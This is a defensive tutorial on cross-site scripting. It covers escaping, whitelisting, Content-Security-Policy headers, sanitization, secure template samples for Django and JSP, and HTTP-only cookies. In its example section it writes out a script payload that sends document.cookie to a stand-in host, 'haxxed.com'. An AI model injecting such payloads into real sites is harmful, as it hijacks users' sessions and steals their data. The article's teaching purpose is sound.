# Cross-Site Scripting (XSS)
***Cross-site scripting (XSS)*** is one of the most common methods hackers use to attack websites. XSS vulnerabilities permit a malicious user to execute arbitrary chunks of JavaScript when other users visit your site.

## Example
On a forum page where users are permitted to type and post text -

User input:
```html
<script> alert('Your session has been hacked!') </script>
```
*This will display an alert popup on any user's screen that views the message.*

Next input:
```html
<script>window.location = 'haxxed.com?cookie=' + document.cookie</script>
```
*This hijacks the user's session and moves them to a new page listed in the `window` parameter.*

## Risks
XSS allows arbitrary execution of JavaScript code, so the damage that can be done by an attacker depends on the sensitivity of the data being handled by your site. Some of the things hackers have done by exploiting XSS:

- *Spreading worms* on social media sites. Facebook, Twitter and YouTube have all been successfully attacked in this way.
- *Session hijacking*. Malicious JavaScript may be able to send the session ID to a remote site under the hacker’s control, allowing the hacker to impersonate that user by hijacking a session in progress.
- *Identity theft*. If the user enters confidential information such as credit card numbers into a compromised website, these details can be stolen using malicious JavaScript.
- *Denial of service attacks* and website vandalism.
- *Theft of sensitive data*, like passwords.
- *Financial fraud* on banking sites.

## Protection
Web pages are made up of HTML, usually described in template files, with dynamic content woven in when the page is rendered. Stored XSS attacks make use of the improper treatment of dynamic content coming from a backend data store. The attacker abuses an editable field by inserting some JavaScript code, which is evaluated in the browser when another user visits that page.

Unless your site is a content-management system, it is rare that you want your users to author raw HTML. Instead, you should escape all dynamic content coming from a data store, so the browser knows it is to be treated as the contents of HTML tags, as opposed to raw HTML.

Escaping dynamic content generally consists of replacing significant characters with the HTML entity encoding:

| Character | Encoding |
|-----------|----------|
| " | &#34 |
| # | &#35 |
| & | &#38 |
| ' | &#39 |
| ( | &#40 |
| ) | &#41 |
| / | &#47 |
| ; | &#59 |
| < | &#60 |
| > | &#62 |

## Whitelist Values
If a particular dynamic data item can only take a handful of valid values, the best practice is to restrict the values in the data store, and have your rendering logic only permit known good values. For instance, instead of asking a user to type in their country of residence, have them select from a drop-down list.

## Content-Security Policy
Modern browsers support Content-Security Policies that allow the author of a web-page to control where JavaScript (and other resources) can be loaded and executed from. XSS attacks rely on the attacker being able to run malicious scripts on a user’s web page - either by injecting inline `<script>` tags somewhere within the `<html>` tag of a page, or by tricking the browser into loading the JavaScript from a malicious third-party domain.

By setting a content security policy in the response header, you can tell the browser to never execute inline JavaScript, and to lock down which domains can host JavaScript for a page:
```html
Content-Security-Policy: script-src 'self' https://apis.google.com
```
*By whitelisting the URIs from which scripts can be loaded, you are implicitly stating that inline JavaScript is not allowed.*

The content security policy can also be set in a <meta> tag in the <head> element of the page:
```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self' https://apis.google.com">
```

*This approach will protect your users very effectively!* However, it may take a considerable amount of discipline to make your site ready for such a header. Inline scripts tags are considered bad practice in modern web-development - mixing content and code makes web-applications difficult to maintain - but are common in older, legacy sites.

To migrate away from inline scripts incrementally, consider makings use of CSP Violation Reports. By adding a report-uri directive in your policy header, the browser will notify you of any policy violations, rather than preventing inline JavaScript from executing:
```html
Content-Security-Policy-Report-Only: script-src 'self'; report-uri http://example.com/csr-reports
```
*This will give you reassurance that there are no lingering inline scripts, before you ban them outright.*

## Sanitize HTML
Some sites have a legitimate need to store and render raw HTML, especially now that `contentEditable` has become part of the HTML5 standard. If your site stores and renders rich content, you need to use a HTML sanitization library to ensure malicious users cannot inject scripts in their HTML submissions.

## Code Samples
The code samples below illustrate good and bad practices when trying to protect against Cross-Site Scripting.

#### Python | Django
Insecure (`| safe` overrides HTML escape):
```python
**{{ contents | safe }}**
```
Secure:
```python
**{{ contents }}**
```

#### Java
Insecure (does not escape HTML):
```java
<%= contents %>

$${contents}

<%
   out.println(contents);
%>

```
Secure (`c:out` safely escapes HTML):
```java
<c:out value="$${contents}">
```

## HTTP-Only Cookies
A session-hijacking attack can use malicious JavaScript to steal the cookie containing the user’s session ID. There is rarely a good reason to read or manipulate cookies in client-side JavaScript, so consider marking cookies as HTTP-only, meaning that cookies will be received, stored, and sent by the browser, but cannot be modified or read by JavaScript.